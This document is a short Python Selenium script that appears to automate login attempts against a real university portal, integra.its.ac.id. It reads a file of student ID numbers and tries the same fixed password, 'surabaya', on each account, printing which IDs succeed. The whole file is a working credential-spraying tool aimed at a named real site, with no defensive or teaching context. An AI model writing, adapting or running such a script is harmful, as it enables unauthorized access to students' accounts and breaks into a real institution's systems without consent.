import time, random
import requests
from selenium import webdriver 
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC 
from selenium.webdriver.firefox.options import Options

url = 'https://integra.its.ac.id/'
# driver = webdriver.Firefox(executable_path='../../geckodriver.exe')
# driver = webdriver.PhantomJS(executable_path='../../phantomjs.exe')
driver = webdriver.Chrome(executable_path='../../chromedriver.exe')

driver.get(url)

def login(nrp, password): 
    email = driver.find_element_by_id('userid')
    pswd = driver.find_element_by_xpath('//*[@id="password"]')

    email.send_keys(nrp)
    pswd.send_keys(password)

    # pswd.send_keys(Keys.ENTER)
    pswd.send_keys(Keys.ENTER)


# login('test','test')
with open('nrp.txt', 'r') as f: 
    koleksi = f.readlines()
def wait_til(xpath):
        WebDriverWait(driver,2).until(
        EC.visibility_of_element_located((By.XPATH,xpath))
    )
koleksi = list(set(koleksi))
koleksi= koleksi[0:10]

for nrp in koleksi: 
    nrp = nrp.strip()
    driver.delete_all_cookies()
    # wait_til('//*[@id="password"]')
    driver.find_element_by_name('userid').send_keys(nrp)
    driver.find_element_by_name('password').send_keys('surabaya')
    driver.find_element_by_name('password').send_keys(Keys.ENTER)
    time.sleep(0.5)
    body = driver.find_element(By.TAG_NAME,'body')
    if 'SI Beasiswa' in body.text: 
        print(nrp, 'masuk')
    else: 
        print(nrp, 'gagal dari f')

driver.quit()